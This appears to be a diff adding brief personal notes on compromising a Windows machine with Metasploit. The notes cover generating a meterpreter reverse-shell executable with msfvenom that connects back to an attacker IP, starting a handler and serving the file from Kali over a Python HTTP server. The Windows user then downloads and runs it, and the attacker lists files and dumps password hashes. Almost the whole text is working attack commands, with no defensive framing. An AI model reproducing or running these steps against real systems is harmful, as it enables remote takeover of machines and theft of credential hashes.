@@ -1,0 +1,22 @@
+ping <windows_ip>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f exe 
+> malware.exe
+
+msfconsole
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST <Attacker_IP> 
+set LPORT <Port> 
+exploit
+
+create a server in kali
+python3 -m http.server 9090
+
+search for the <ip on which the server is running> in windows browser
+download the malware file
+execute it
+
+go to kali
+check msfconsole
+we will be having access to the windows
+give ls, hashdump
